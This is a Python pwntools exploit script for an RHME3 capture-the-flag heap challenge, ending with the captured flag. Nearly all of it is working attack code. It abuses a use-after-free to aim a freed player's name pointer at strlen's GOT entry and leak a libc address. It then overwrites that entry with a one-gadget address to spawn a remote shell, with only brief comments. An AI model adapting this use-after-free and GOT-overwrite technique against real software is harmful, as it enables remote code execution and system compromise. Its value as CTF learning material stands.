from pwn import *
from binascii import hexlify, unhexlify

context.binary = './main.elf'

got_strlen = context.binary.got['strlen']

onegadget_off = 0x4526a

strlen_off = ELF('./libc.so.6').symbols['strlen']

def create(p, name):
        p.sendline('1')
        print p.recvuntil('name:')
        p.sendline(name)
        print p.recvuntil('attack points:')
        p.sendline('0')
        print p.recvuntil('defense points:')
        p.sendline('0')
        print p.recvuntil('speed:')
        p.sendline('0')
        print p.recvuntil('precision:')
        p.sendline('0')
        print p.recvuntil('choice:')

def select(p, idx):
        p.sendline('3')
        print p.recvuntil('index:')
        p.sendline(idx)
        print p.recvuntil('choice:')

def remove(p, idx):
        p.sendline('2')
        print p.recvuntil('index')
        p.sendline(idx)
        print p.recvuntil('choice:')



#p = process('./main.elf')

p = remote('pwn.rhme.riscure.com', 1337)

print p.recvuntil(':')

create(p, 'a'*254)

create(p, 'b'*254)

select(p, '0')

# Player 0 is still selected, use-after-free
remove(p, '0')

remove(p, '1')

# Name overwrites the selected Player chunk (which was freed before)
# P0->name now points to got['strlen']
create(p, 'a'*16 + p64(got_strlen) + 'a'*8)

# Now leak the libc addr by reading the name of P0
p.sendline('5')

p.recv(512,timeout=1)

leak =  p.recv(512,timeout=1).split('Name: ')[1].split('\n')[0]


strlen_addr = int(hexlify(leak[::-1]),16)

print "Leaked strlen = 0x%x" % strlen_addr

onegadget_addr = strlen_addr - strlen_off + onegadget_off

print "Computed onegadget addr = 0x%x" % onegadget_addr

# Rewrite the GOT by renaming P0
p.sendline('4')
p.recvuntil('Your choice:')
p.sendline('1')
p.recvuntil('Enter new name:')
p.sendline(p64(onegadget_addr))
p.recvuntil('Your choice:')
p.sendline('0')

# Trigger strlen, calls onegadget in the got

p.sendline('1')
print p.recvuntil('name:')
p.sendline('\x00'*254)

p.interactive()

# RHME3{h3ap_0f_tr0uble?}